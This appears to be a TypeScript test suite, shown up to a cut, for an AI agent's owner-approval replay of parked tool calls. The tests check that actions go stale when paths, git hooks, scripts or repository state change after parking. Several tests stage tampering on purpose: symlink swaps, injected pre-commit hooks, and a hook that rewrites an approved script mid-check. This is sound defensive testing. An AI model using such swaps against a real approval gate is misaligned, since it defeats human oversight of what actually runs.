import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, lstatSync, readdirSync, readFileSync, realpathSync, renameSync, rmSync, symlinkSync, unlinkSync, utimesSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { test } from 'node:test';
import { Type } from '@sinclair/typebox';
import type { AppConfig } from '../src/config/schema.ts';
import { parseConfig } from '../src/config/store.ts';
import { openDatabase } from '../src/db/database.ts';
import { KV } from '../src/db/kv.ts';
import { MIGRATIONS } from '../src/db/migrations.ts';
import { MemoryStore } from '../src/memory/store.ts';
import { resolvePaths } from '../src/paths.ts';
import { replayAction, type ReplayDeps } from '../src/pending/replay.ts';
import { boundFacts } from '../src/pending/snapshot.ts';
import { PendingStore } from '../src/pending/store.ts';
import { PlanStore } from '../src/projects/plan.ts';
import { ProjectStore } from '../src/projects/store.ts';
import { rootKeyOf } from '../src/projects/work-folder.ts';
import { TaskStore } from '../src/tasks/store.ts';
import { BROWSER_TOOLS } from '../src/tools/builtin/browser.ts';
import { fileRead } from '../src/tools/builtin/files.ts';
import { planWrite } from '../src/tools/builtin/plan.ts';
import { shellPreCheck, shellRun } from '../src/tools/builtin/shell.ts';
import { readFilesOf } from '../src/tools/pipeline.ts';
import { taskCreate } from '../src/tools/builtin/tasks.ts';
import { buildPolicy, defaultWorkspace } from '../src/tools/policy.ts';
import { ToolRegistry } from '../src/tools/registry.ts';
import type { PreCheck, ToolContext, ToolDef } from '../src/tools/types.ts';
import { tempDir, testConfig } from './helpers.ts';

type Seen = { home?: string | undefined; parent?: ToolContext['parent']; task?: string | undefined; tainted: boolean; conversationTainted: boolean };

function setup(t: { after: (fn: () => void) => void }, options: { conversationGone?: boolean; conversationTainted?: boolean; extraRoot?: boolean; extraWrite?: boolean } = {}) {
  const dir = tempDir(t);
  const paths = resolvePaths(dir);
  mkdirSync(paths.workspace, { recursive: true });
  mkdirSync(join(paths.data, 'extra'), { recursive: true });
  const raw = testConfig();
  raw.tools.roots = [{ path: 'workspace', mode: 'write' }, ...(options.extraRoot ? [{ path: 'extra', mode: options.extraWrite ? 'write' as const : 'read' as const }] : [])];
  let config: AppConfig = parseConfig(raw);
  const db = openDatabase(':memory:', MIGRATIONS);
  t.after(() => db.close());
  const ran: unknown[] = [];
  const seen: Seen[] = [];
  const counter: ToolDef<{ text: string }> = {
    name: 'fake_count', description: 'count', input: Type.Object({ text: Type.String() }), effect: 'exec', allowedIn: ['chat', 'task', 'agent'],
    summarize: input => ({ title: 'Count', body: input.text }),
    execute: async (input, _ctx, info) => { ran.push({ input, approvedOnce: info?.approvedOnce }); return { content: input.text, exitCode: 0 }; },
  };
  const remover: ToolDef<{ path: string }> = {
    name: 'fake_delete', description: 'delete', input: Type.Object({ path: Type.String() }), effect: 'write', allowedIn: ['chat', 'task'],
    summarize: input => ({ title: 'Delete', body: `rm -r ${input.path}` }),
    execute: async input => { ran.push(input); rmSync(input.path, { recursive: true, force: true }); return { content: 'deleted', exitCode: 0 }; },
  };
  const probe: ToolDef<Record<string, never>> = {
    name: 'fake_probe', description: 'probe', input: Type.Object({}), effect: 'meta', allowedIn: ['chat', 'task', 'agent'],
    execute: async (_input, ctx) => {
      let conversationTainted = false;
      try { conversationTainted = ctx.conversationTainted?.() ?? false; } catch { conversationTainted = true; }
      seen.push({ home: ctx.home, parent: ctx.parent, task: ctx.task?.id, tainted: ctx.taint.tainted, conversationTainted });
      return { content: 'probed' };
    },
  };
  const fetcher: ToolDef<{ url: string }> = {
    name: 'fake_fetch', description: 'fetch', input: Type.Object({ url: Type.String() }), effect: 'network', allowedIn: ['chat', 'task'],
    execute: async input => ({ content: `got ${input.url}` }),
  };
  const sender: ToolDef<{ to: string }> = {
    name: 'fake_send', description: 'send', input: Type.Object({ to: Type.String() }), effect: 'exec', allowedIn: ['chat', 'task'],
    preCheck: () => ({ decision: 'ask', reasons: ['sends'], askKinds: ['egress'] }),
    execute: async input => ({ content: `sent ${input.to}`, exitCode: 0 }),
  };
  const fullOutput = join(paths.data, 'tool_outputs', 'shell-test.log');
  const erasing: ToolDef<Record<string, never>> = {
    name: 'fake_full', description: 'full', input: Type.Object({}), effect: 'exec', allowedIn: ['chat', 'task'],
    execute: async () => {
      mkdirSync(join(paths.data, 'tool_outputs'), { recursive: true });
      writeFileSync(fullOutput, 'long output of the erased conversation');
      live.delete('conv-1');
      return { content: 'tail', fullRef: fullOutput, exitCode: 0 };
    },
  };
  const registry = new ToolRegistry().register(counter).register(remover).register(probe).register(fetcher).register(sender).register(erasing)
    .register(fileRead).register(shellRun).register(taskCreate).register(planWrite).register(BROWSER_TOOLS[3]);
  const store = new PendingStore(db, { tools: registry, dataDir: paths.data });
  const tasks = new TaskStore(db);
  const projects = new ProjectStore(db, paths.projects);
  const kv = new KV(db);
  const plans = new PlanStore(kv, { projects: paths.projects, backups: paths.backups });
  const memory = new MemoryStore(db);
  const live = new Set(['conv-1']);
  if (options.conversationGone) live.clear();
  const deps: ReplayDeps = {
    db, store, registry, config: () => config, paths, projects, conversationExists: id => live.has(id),
    conversationTainted: () => options.conversationTainted === true,
    services: () => ({ db, memory, tasks, plans, projects, emit: () => undefined }),
  };
  const park = (over: Partial<Parameters<PendingStore['park']>[0]>) => store.park({
    tool: 'fake_count', input: { text: 'hello' }, cwd: paths.workspace, kind: 'judge', reason: 'Judge unsure', runId: 'run-1', runKind: 'chat', conversationId: 'conv-1', ...over,
  });
  const approve = (id: number) => replayAction(store.claim(id), deps);
  const ctxFor = (over: Partial<ToolContext> = {}): ToolContext => ({
    runId: 'run-1', conversationId: 'conv-1', kind: 'chat', signal: new AbortController().signal, config, paths,
    policy: buildPolicy(config, paths), workspace: paths.workspace, taint: { tainted: false, sources: [] }, log: () => undefined, ...over,
  });
  return { dir, paths, db, store, deps, park, approve, ran, seen, live, fullOutput, tasks, projects, plans, ctxFor, setConfig: (next: AppConfig) => { config = next; }, config: () => config };
}

test('Approve で 1 回だけ動く: tool_calls に owner-pending の行、結果の末尾と終了コードが行に入る', async t => {
  const s = setup(t);
  const long = `${'a'.repeat(2500)}END`;
  const row = await s.park({ input: { text: long } });
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'ran');
  assert.equal(s.ran.length, 1);
  assert.deepEqual(s.ran[0], { input: { text: long }, approvedOnce: true });
  const after = s.store.view(row.id)!;
  assert.equal(after.status, 'ran');
  assert.equal(after.exit_code, 0);
  assert.equal(after.output_preview!.length, 2000);
  assert.ok(after.output_preview!.endsWith('END'), '結果の末尾');
  assert.ok(after.ran_at && after.decided_at);
  assert.equal(after.fetched, false);
  assert.equal(s.store.row(row.id)!.input, '', '動いたあとは生の入力を持たない');
  const calls = s.db.prepare("SELECT run_id, conversation_id, tool, decision, decided_by, approval_id, ok, evidence_no FROM tool_calls WHERE decided_by = 'owner-pending'").all();
  assert.deepEqual(calls.map(c => ({ ...c })), [{ run_id: 'run-1', conversation_id: 'conv-1', tool: 'fake_count', decision: 'allow', decided_by: 'owner-pending', approval_id: `pending:${row.id}`, ok: 1, evidence_no: null }]);
});

const ownerPendingCount = (s: ReturnType<typeof setup>): number =>
  Number((s.db.prepare("SELECT COUNT(*) AS n FROM tool_calls WHERE decided_by = 'owner-pending'").get() as { n: number }).n);

test('承認の時点でパスが禁止になっていた（tools.deny を足した）→ 動かず failed', async t => {
  const s = setup(t);
  const secretDir = join(s.paths.workspace, 'private');
  mkdirSync(secretDir);
  writeFileSync(join(secretDir, 'a.txt'), 'x');
  const input = { path: join(secretDir, 'a.txt') };
  const check = await fileRead.preCheck!(input, s.ctxFor());
  const row = await s.park({ tool: 'file_read', input, check });
  const next = structuredClone(s.config());
  next.tools.deny = [...next.tools.deny, secretDir];
  s.setConfig(next);
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'failed');
  assert.match(s.store.view(row.id)!.output_preview ?? '', /Not run/u);
  assert.equal(ownerPendingCount(s), 0);
});

test('積んだあとに許可フォルダから外れた（事前の判定に新しい確かめの理由が出た）→ 動かず stale', async t => {
  const s = setup(t, { extraRoot: true });
  const file = join(s.paths.data, 'extra', 'doc.md');
  writeFileSync(file, 'doc');
  const input = { command: `cat "${file}"` };
  const check = shellPreCheck(input, s.ctxFor());
  assert.equal(check.decision, 'allow', '前提: 積んだときは許可フォルダの中');
  const row = await s.park({ tool: 'shell_run', input, check });
  const next = structuredClone(s.config());
  next.tools.roots = next.tools.roots.filter(r => !r.path.endsWith('extra'));
  s.setConfig(next);
  assert.equal(shellPreCheck(input, s.ctxFor({ policy: buildPolicy(s.config(), s.paths) })).decision, 'ask', '前提: 外したあとは ask（deny ではない）');
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'stale', s.store.view(row.id)!.output_preview ?? '');
  assert.equal(ownerPendingCount(s), 0);
});

test('作業フォルダが消えていた → failed。許可フォルダの外になった → failed', async t => {
  const s = setup(t);
  const gone = join(s.paths.workspace, 'gone');
  mkdirSync(gone);
  const row = await s.park({ cwd: gone });
  rmSync(gone, { recursive: true });
  assert.equal((await s.approve(row.id)).status, 'failed');
  assert.match(s.store.view(row.id)!.output_preview ?? '', /no longer exists/u);
  const outside = join(s.dir, 'outside');
  mkdirSync(outside);
  const away = await s.park({ cwd: outside });
  assert.equal((await s.approve(away.id)).status, 'failed');
  assert.match(s.store.view(away.id)!.output_preview ?? '', /outside the allowed folders/u);
  assert.equal(s.ran.length, 0);
});

test('作業フォルダが積んだあとに別の場所へのリンクに替わっていた → stale', async t => {
  const s = setup(t);
  const work = join(s.paths.workspace, 'work');
  mkdirSync(work);
  const row = await s.park({ cwd: work });
  const elsewhere = join(s.dir, 'elsewhere');
  mkdirSync(elsewhere);
  renameSync(work, join(s.paths.workspace, 'moved'));
  symlinkSync(elsewhere, work, 'junction');
  assert.equal(realpathSync(work), realpathSync(elsewhere), '前提: 同じ名前が別の場所を指す');
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'stale');
  assert.equal(s.ran.length, 0);
});

test('元の会話を消した → cancelled（動かない）', async t => {
  const s = setup(t, { conversationGone: true });
  const row = await s.park({});
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'cancelled');
  assert.equal(s.ran.length, 0);
  assert.equal(s.store.view(row.id)!.status, 'cancelled');
});

function product(s: ReturnType<typeof setup>) {
  const root = join(s.paths.workspace, 'prod');
  mkdirSync(root, { recursive: true });
  return s.projects.create({ name: 'Prod', root, rootKey: rootKeyOf(root), checkCommand: null });
}

test('製品をしまった → cancelled。製品のフォルダが無い → failed', async t => {
  const s = setup(t);
  const p = product(s);
  const row = await s.park({ projectId: p.id, cwd: p.root });
  s.projects.update(p.id, { archived: true });
  assert.equal((await s.approve(row.id)).status, 'cancelled');
  const q = s.projects.create({ name: 'Q', root: join(s.paths.workspace, 'q'), rootKey: rootKeyOf(join(s.paths.workspace, 'q')), checkCommand: null });
  const missing = await s.park({ projectId: q.id, cwd: s.paths.workspace });
  assert.equal((await s.approve(missing.id)).status, 'failed');
  assert.match(s.store.view(missing.id)!.output_preview ?? '', /could not be found/u);
  assert.equal(s.ran.length, 0);
});

test('道具を Block にした・ブラウザを切った・入力が道具に合わない → failed', async t => {
  const s = setup(t);
  const blocked = await s.park({});
  const next = structuredClone(s.config());
  next.tools.policies = { ...next.tools.policies, fake_count: 'block' };
  s.setConfig(next);
  assert.equal((await s.approve(blocked.id)).status, 'failed');
  assert.match(s.store.view(blocked.id)!.output_preview ?? '', /Block/u);
  const browser = await s.park({ tool: 'browser_close', input: {}, check: { decision: 'allow', reasons: [] } });
  assert.equal((await s.approve(browser.id)).status, 'failed');
  assert.match(s.store.view(browser.id)!.output_preview ?? '', /browser is turned off/u);
  const bad = await s.park({ tool: 'fake_probe', input: {} });
  s.db.prepare("UPDATE pending_actions SET input = '{\"unexpected\":1,' WHERE id = ?").run(bad.id);
  assert.equal((await s.approve(bad.id)).status, 'failed');
  assert.match(s.store.view(bad.id)!.output_preview ?? '', /no longer fits/u);
});

test('持ち主の実行前フックは承認のときにも回る。deny なら failed', async t => {
  const s = setup(t);
  const row = await s.park({});
  const next = structuredClone(s.config());
  next.tools.hooks.preToolUse = [{ matcher: 'fake_count', command: [process.execPath, '-e', 'process.stderr.write("no by hook"); process.exit(2)'], timeoutMs: 10_000, onError: 'deny' }];
  s.setConfig(next);
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'failed');
  assert.match(s.store.view(row.id)!.output_preview ?? '', /no by hook/u);
  assert.equal(s.ran.length, 0);
  const ok = structuredClone(s.config());
  ok.tools.hooks.preToolUse = [{ matcher: 'fake_count', command: [process.execPath, '-e', 'console.log(JSON.stringify({decision:"ask"}))'], timeoutMs: 10_000, onError: 'deny' }];
  s.setConfig(ok);
  const asked = await s.park({});
  assert.equal((await s.approve(asked.id)).status, 'ran', 'フックの ask は承認で足りる');
});

test('積んだ実行の素性を引き継ぐ: タスク・外を読んだ印・ホーム・子の担当の親', async t => {
  const s = setup(t, { conversationTainted: true });
  const plain = await s.park({ tool: 'fake_probe', input: {}, taskId: 'k1', runKind: 'task', tainted: true });
  assert.equal((await s.approve(plain.id)).status, 'ran');
  const p = product(s);
  const inProduct = await s.park({ tool: 'fake_probe', input: {}, projectId: p.id, cwd: p.root });
  assert.equal((await s.approve(inProduct.id)).status, 'ran');
  assert.deepEqual(s.seen[0], { home: defaultWorkspace(buildPolicy(s.config(), s.paths), s.paths), parent: undefined, task: 'k1', tainted: true, conversationTainted: true });
  assert.equal(s.seen[1]!.home, s.paths.workspace, '製品の行でもホームは製品のフォルダではない');
  assert.equal(s.seen[1]!.tainted, false);
  s.db.prepare("INSERT INTO conversations (id, kind, title, created_at, last_message_at) VALUES ('parent-conv', 'chat', 'p', 1, 1), ('conv-1', 'task', 'Child job', 1, 1)").run();
  s.db.prepare("INSERT INTO engine_runs (id, kind, conversation_id, started_at) VALUES ('parent-run', 'chat', 'parent-conv', 1)").run();
  s.db.prepare("INSERT INTO engine_runs (id, kind, conversation_id, started_at, parent_run_id) VALUES ('child-run', 'agent', 'conv-1', 1, 'parent-run')").run();
  const child = await s.park({ tool: 'fake_probe', input: {}, runKind: 'agent', runId: 'child-run' });
  assert.equal((await s.approve(child.id)).status, 'ran');
  assert.deepEqual(s.seen[2]!.parent, { runId: 'parent-run', conversationId: 'parent-conv', kind: 'chat', title: 'Child job' });
});

test('自分で決めたタスク（self）から積んだ task_create は、承認しても self のまま', async t => {
  const s = setup(t);
  const own = s.tasks.create({ title: 'Self work', origin: 'self', actor: 'beat' });
  const row = await s.park({ tool: 'task_create', input: { title: 'Follow up', requested_by_user: true }, taskId: own.id, runKind: 'task', kind: 'owner' });
  assert.equal((await s.approve(row.id)).status, 'ran', s.store.view(row.id)!.output_preview ?? '');
  const made = s.tasks.list().find(t2 => t2.title === 'Follow up');
  assert.equal(made?.origin, 'self');
});

test('外を読んだ会話から積んだ plan_write は、承認しても「外を読んだ」印のまま', async t => {
  const s = setup(t, { conversationTainted: true });
  const p = product(s);
  const row = await s.park({ tool: 'plan_write', input: { content: '# Plan\n- step' }, projectId: p.id, cwd: p.root, kind: 'policy' });
  assert.equal((await s.approve(row.id)).status, 'ran', s.store.view(row.id)!.output_preview ?? '');
  assert.equal(s.plans.view(p.id).tainted, true);
});

test('通信した・持ち主が通した「外とやり取りする」確かめの行は fetched を返し、行にも残す', async t => {
  const s = setup(t);
  const net = await s.park({ tool: 'fake_fetch', input: { url: 'https://example.com' } });
  const a = await s.approve(net.id);
  assert.equal(a.fetched, true);
  assert.equal(s.store.view(net.id)!.fetched, true);
  const check: PreCheck = { decision: 'ask', reasons: ['sends'], askKinds: ['egress'] };
  const send = await s.park({ tool: 'fake_send', input: { to: 'x' }, check });
  const b = await s.approve(send.id);
  assert.equal(b.status, 'ran');
  assert.equal(b.fetched, true);
  assert.equal(s.store.view(send.id)!.fetched, true);
});

function git(cwd: string, ...args: string[]): void {
  execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.com', '-c', 'commit.gpgsign=false', ...args], { cwd, stdio: 'ignore' });
}

function repo(s: ReturnType<typeof setup>) {
  const root = join(s.paths.workspace, 'repo');
  mkdirSync(join(root, 'out'), { recursive: true });
  git(root, 'init', '-q');
  writeFileSync(join(root, 'kept.txt'), 'kept');
  git(root, 'add', 'kept.txt');
  git(root, 'commit', '-q', '-m', 'first');
  writeFileSync(join(root, 'notes.md'), 'owner notes');
  writeFileSync(join(root, 'out', 'a.log'), 'a');
  return root;
}

test('消すの行: 積んだあとに対象のファイルが変わった → 動かず stale、前と今が返る', async t => {
  const s = setup(t);
  const root = repo(s);
  const target = join(root, 'notes.md');
  const row = await s.park({ tool: 'fake_delete', input: { path: target }, cwd: root, kind: 'delete', targets: [target] });
  writeFileSync(target, 'owner notes, now longer');
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'stale');
  assert.ok(existsSync(target), '消していない');
  assert.equal(s.ran.length, 0);
  assert.ok(outcome.changes!.some(c => c.what.includes('notes.md') && c.before !== c.now));
  assert.match(s.store.view(row.id)!.output_preview ?? '', /notes\.md/u);
});

test('消すの行: フォルダの中のファイルが増えた → stale', async t => {
  const s = setup(t);
  const root = repo(s);
  const target = join(root, 'out');
  const row = await s.park({ tool: 'fake_delete', input: { path: target }, cwd: root, kind: 'delete', targets: [target] });
  writeFileSync(join(target, 'b.log'), 'b');
  assert.equal((await s.approve(row.id)).status, 'stale');
  assert.ok(existsSync(join(target, 'a.log')));
});

test('消すの行: 積んだあとに HEAD が変わった → stale', async t => {
  const s = setup(t);
  const root = repo(s);
  const target = join(root, 'notes.md');
  const row = await s.park({ tool: 'fake_delete', input: { path: target }, cwd: root, kind: 'delete', targets: [target] });
  git(root, 'commit', '-q', '--allow-empty', '-m', 'second');
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'stale');
  assert.ok(outcome.changes!.some(c => c.what === 'HEAD'));
});

test('消すの行: 作業ツリーが変わった（追っているファイルを書き換えた）→ stale', async t => {
  const s = setup(t);
  const root = repo(s);
  const target = join(root, 'notes.md');
  const row = await s.park({ tool: 'fake_delete', input: { path: target }, cwd: root, kind: 'delete', targets: [target] });
  writeFileSync(join(root, 'kept.txt'), 'changed');
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'stale');
  assert.ok(outcome.changes!.some(c => c.what === 'git status'));
});

test('消すの行: git の状態を調べられないリポジトリ（設定にふつうでない項目）では、変わっていなくても stale', async t => {
  const s = setup(t);
  const root = repo(s);
  git(root, 'config', 'remote.origin.gh-resolved', 'base');
  const row = await s.park({ tool: 'fake_delete', input: { path: root }, cwd: root, kind: 'delete', targets: [] });
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'stale');
  assert.equal(s.ran.length, 0);
});

test('消すの行: 変わっていなければ動く', async t => {
  const s = setup(t);
  const root = repo(s);
  const target = join(root, 'notes.md');
  const row = await s.park({ tool: 'fake_delete', input: { path: target }, cwd: root, kind: 'delete', targets: [target] });
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'ran');
  assert.ok(!existsSync(target));
});

test('積んだあとに git のフックが足された（事前の判定に新しい理由）→ stale', async t => {
  const s = setup(t);
  const root = repo(s);
  const input = { command: 'git commit --allow-empty -m next', cwd: root };
  const check = shellPreCheck(input, s.ctxFor());
  const row = await s.park({ tool: 'shell_run', input, check, cwd: root });
  writeFileSync(join(root, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\necho hooked > hooked.txt\n');
  const again = shellPreCheck(input, s.ctxFor());
  assert.notDeepEqual([...again.reasons].sort(), [...check.reasons].sort(), '前提: フックを足すと理由が増える');
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'stale');
  assert.ok(!existsSync(join(root, 'hooked.txt')));
});

test('スクリプトを動かす行: 積んだあとに中身を書き換えた → 動かず stale（bind が違う）', async t => {
  const s = setup(t);
  const outside = join(s.dir, 'elsewhere');
  mkdirSync(outside);
  const script = join(outside, 'job.js');
  writeFileSync(script, "console.log('first version')");
  const input = { command: `node "${script}"` };
  const check = shellPreCheck(input, s.ctxFor());
  assert.ok(check.bind, '前提: 事前の判定がスクリプトの指紋を付ける');
  const row = await s.park({ tool: 'shell_run', input, check, preview: check.preview });
  writeFileSync(script, "console.log('second version')");
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'stale');
  assert.match(s.store.view(row.id)!.output_preview ?? '', /changed after it was parked/u);
});

test('スクリプトを動かす行: 書き換えていなければ動き、行に積んだときの中身が見える', async t => {
  const s = setup(t);
  const outside = join(s.dir, 'elsewhere');
  mkdirSync(outside);
  const script = join(outside, 'job.js');
  writeFileSync(script, "console.log('ran-from-pending')");
  const input = { command: `node "${script}"` };
  const check = shellPreCheck(input, s.ctxFor());
  const row = await s.park({ tool: 'shell_run', input, check, preview: check.preview });
  assert.equal(s.store.view(row.id)!.preview[0]!.text, "console.log('ran-from-pending')");
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'ran', s.store.view(row.id)!.output_preview ?? '');
  const after = s.store.view(row.id)!;
  assert.equal(after.exit_code, 0);
  assert.match(after.output_preview ?? '', /ran-from-pending/u);
  unlinkSync(script);
});

test('持ち主のフックが動いている間にスクリプトを書き換えた → 動かず stale（確かめはフックのあと、実行の直前）', async t => {
  const s = setup(t);
  const outside = join(s.dir, 'elsewhere');
  mkdirSync(outside);
  const script = join(outside, 'job.js');
  writeFileSync(script, "console.log('APPROVED VERSION')");
  const input = { command: `node "${script}"` };
  const check = shellPreCheck(input, s.ctxFor());
  const row = await s.park({ tool: 'shell_run', input, check });
  const swap = `require('fs').writeFileSync(${JSON.stringify(script)}, "console.log('SWAPPED VERSION')"); setTimeout(() => {}, 300);`;
  const next = structuredClone(s.config());
  next.tools.hooks.preToolUse = [{ matcher: 'shell_run', command: [process.execPath, '-e', swap], timeoutMs: 10_000, onError: 'deny' }];
  s.setConfig(next);
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'stale', s.store.view(row.id)!.output_preview ?? '');
  assert.doesNotMatch(s.store.view(row.id)!.output_preview ?? '', /SWAPPED VERSION/u);
});

test('git のフックの中身を積んだあとに書き換えた → stale（フックの指紋が bind に入る）', async t => {
  const s = setup(t);
  const root = repo(s);
  const hook = join(root, '.git', 'hooks', 'pre-commit');
  writeFileSync(hook, '#!/bin/sh\necho approved\n');
  const input = { command: 'git commit --allow-empty -m next', cwd: root };
  const check = shellPreCheck(input, s.ctxFor());
  assert.ok(check.bind, '前提: フックのあるリポジトリの git は指紋を付ける');
  const row = await s.park({ tool: 'shell_run', input, check, cwd: root });
  writeFileSync(hook, '#!/bin/sh\necho swapped > swapped.txt\n');
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'stale', s.store.view(row.id)!.output_preview ?? '');
  assert.ok(!existsSync(join(root, 'swapped.txt')));
});

test('動いている間に会話を消した → 長い出力の全文ファイルも消す', async t => {
  const s = setup(t);
  const row = await s.park({ tool: 'fake_full', input: {} });
  assert.equal((await s.approve(row.id)).status, 'ran');
  assert.ok(!existsSync(s.fullOutput), '全文ファイルが残らない');
  assert.equal(s.store.view(row.id)!.output_preview, null);
});

test('読む先の親フォルダが、積んだあとに別の許可フォルダへのリンクに替わった → stale（照らしに実際のパスが入る）', async t => {
  const s = setup(t, { extraRoot: true, extraWrite: true });
  const sub = join(s.paths.workspace, 'sub');
  mkdirSync(sub);
  writeFileSync(join(sub, 'doc.md'), 'mine');
  writeFileSync(join(s.paths.data, 'extra', 'doc.md'), 'other');
  const input = { command: `cat "${join(sub, 'doc.md')}"` };
  const check = shellPreCheck(input, s.ctxFor());
  assert.equal(check.decision, 'allow', '前提: どちらの場所でも許可フォルダの中');
  const row = await s.park({ tool: 'shell_run', input, check });
  renameSync(sub, join(s.paths.workspace, 'sub-old'));
  symlinkSync(join(s.paths.data, 'extra'), sub, 'junction');
  assert.equal(shellPreCheck(input, s.ctxFor()).decision, 'allow', '前提: 替えたあとも allow のまま');
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'stale', s.store.view(row.id)!.output_preview ?? '');
});

async function parkShell(s: ReturnType<typeof setup>, root: string, command: string, over: Partial<Parameters<PendingStore['park']>[0]> = {}) {
  const input = { command, cwd: root };
  const check = shellPreCheck(input, s.ctxFor());
  const read = readFilesOf(check);
  return s.park({ tool: 'shell_run', input, check, cwd: root, workspace: s.paths.workspace, files: read.files, filesMore: read.more, places: check.places, created: check.created, pushes: check.pushes, ...over });
}

function gitRepo(s: ReturnType<typeof setup>, ...init: string[]) {
  const root = join(s.paths.workspace, 'repo');
  mkdirSync(join(root, 'src', 'deep'), { recursive: true });
  git(root, 'init', '-q', ...init);
  git(root, 'config', 'user.name', 't');
  git(root, 'config', 'user.email', 't@example.com');
  for (const name of ['kept.txt', join('src', 'a.txt'), join('src', 'deep', 'b.txt'), join('src', 'deep', 'c.txt')]) writeFileSync(join(root, name), name);
  git(root, 'add', '.');
  git(root, 'commit', '-q', '-m', 'first');
  writeFileSync(join(root, 'kept.txt'), 'kept, edited');
  git(root, 'add', 'kept.txt');
  const past = new Date(Date.now() - 60_000);
  utimesSync(join(root, 'src', 'a.txt'), past, past);
  return root;
}

function ownerRunsStatus(root: string): void {
  const index = join(root, '.git', 'index');
  const before = lstatSync(index).mtimeMs;
  git(root, 'status');
  assert.notEqual(lstatSync(index).mtimeMs, before, '前提: git status が .git/index を書き直す');
}

const COMMIT_ALL = 'git add . ; git commit -m next';
const strictMark = (root: string): string => boundFacts([root])[0]!.hash!;
const folderMark = (root: string): string => {
  const mark = boundFacts([root])[0]!.relaxed;
  assert.ok(mark, '前提: index を読み解けて、緩い控えがある');
  return mark;
};
const lastSubject = (root: string): string => execFileSync('git', ['log', '--format=%s', '-1'], { cwd: root, encoding: 'utf8' }).trim();

test('積んだ git commit: 持ち主が間に git status を打っただけでは stale にならず、Approve で動く', async t => {
  const s = setup(t);
  const root = gitRepo(s);
  const row = await parkShell(s, root, COMMIT_ALL);
  assert.ok(JSON.parse(s.store.row(row.id)!.state!).sent?.length, '前提: リポジトリのフォルダが控えに入る');
  ownerRunsStatus(root);
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'ran', s.store.view(row.id)!.output_preview ?? '');
  assert.equal(lastSubject(root), 'next');
});

for (const [name, change] of [
  ['別の git add', (root: string) => git(root, 'add', '-f', 'extra.bin')],
  ['index から外す（git rm --cached）', (root: string) => git(root, 'rm', '-q', '--cached', join('src', 'deep', 'c.txt'))],
  ['別のコミット', (root: string) => git(root, 'commit', '-q', '-m', 'other')],
  ['枝を替える', (root: string) => git(root, 'checkout', '-q', '-b', 'other')],
  ['.git/config を書き換える', (root: string) => git(root, 'config', 'core.editor', 'true')],
  ['フックを足す', (root: string) => writeFileSync(join(root, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\necho hooked > hooked.txt\n')],
] as const) test(`積んだ git commit: 積んだあとに${name} → stale`, async t => {
  const s = setup(t);
  const root = gitRepo(s);
  writeFileSync(join(root, '.gitignore'), 'extra.bin\n');
  writeFileSync(join(root, 'extra.bin'), 'extra');
  const row = await parkShell(s, root, COMMIT_ALL);
  change(root);
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'stale', s.store.view(row.id)!.output_preview ?? '');
  assert.notEqual(lastSubject(root), 'next');
  assert.ok(!existsSync(join(root, 'hooked.txt')));
});

test('積んだ git commit: index.threads のあるリポジトリ（EOIE・IEOT つき）でも、git status のあと Approve で動く', async t => {
  const s = setup(t);
  const root = gitRepo(s);
  git(root, 'config', 'index.threads', '2');
  git(root, 'update-index', '--force-write');
  const index = readFileSync(join(root, '.git', 'index'));
  assert.ok(index.includes('EOIE', 12, 'latin1') && index.includes('IEOT', 12, 'latin1'), '前提: index に EOIE と IEOT がある');
  const row = await parkShell(s, root, COMMIT_ALL);
  ownerRunsStatus(root);
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'ran', s.store.view(row.id)!.output_preview ?? '');
});

for (const [name, command, over] of [
  ['git でない行', 'ls .', {}],
  ['送る行', 'ls .', { kind: 'send' }],
  ['git の add / commit 以外が混ざる行', 'git add . ; git status', {}],
] as const) test(`${name}: 積んだあとに git status → 前と同じく stale（時刻で比べる）`, async t => {
  const s = setup(t);
  const root = gitRepo(s);
  const row = await parkShell(s, root, command, over);
  assert.ok(JSON.parse(s.store.row(row.id)!.state!).sent?.length, '前提: リポジトリのフォルダが控えに入る');
  ownerRunsStatus(root);
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'stale', s.store.view(row.id)!.output_preview ?? '');
  assert.match(s.store.view(row.id)!.output_preview ?? '', /files it reads or sends changed/u);
});

test('送る行: index に時刻の控え（UNTR）を足して大きさだけ変えた → stale（中身に入らないバイトも見る）', async t => {
  const s = setup(t);
  const root = gitRepo(s);
  const index = join(root, '.git', 'index');
  const fixed = new Date(1_700_000_000_000);
  const pin = (): void => { for (const path of [index, join(root, '.git')]) utimesSync(path, fixed, fixed); };
  pin();
  const loose = folderMark(root);
  const row = await parkShell(s, root, 'ls .', { kind: 'send' });
  writeFileSync(index, withExtension(readFileSync(index), 'UNTR', 1_000_000));
  pin();
  assert.equal(folderMark(root), loose, '前提: 緩い控えは UNTR を見ない');
  const outcome = await s.approve(row.id);
  assert.equal(outcome.status, 'stale', s.store.view(row.id)!.output_preview ?? '');
});

test('この直しの前に積んだ行（緩い控えが無い）: git status のあとは stale', async t => {
  const s = setup(t);
  const root = gitRepo(s);
  const row = await parkShell(s, root, COMMIT_ALL);
  const state = JSON.parse(s.store.row(row.id)!.state!);
  assert.ok(state.sent[0].relaxed, '前提: 新しい行は緩い控えを持つ');
  delete state.sent[0].relaxed;
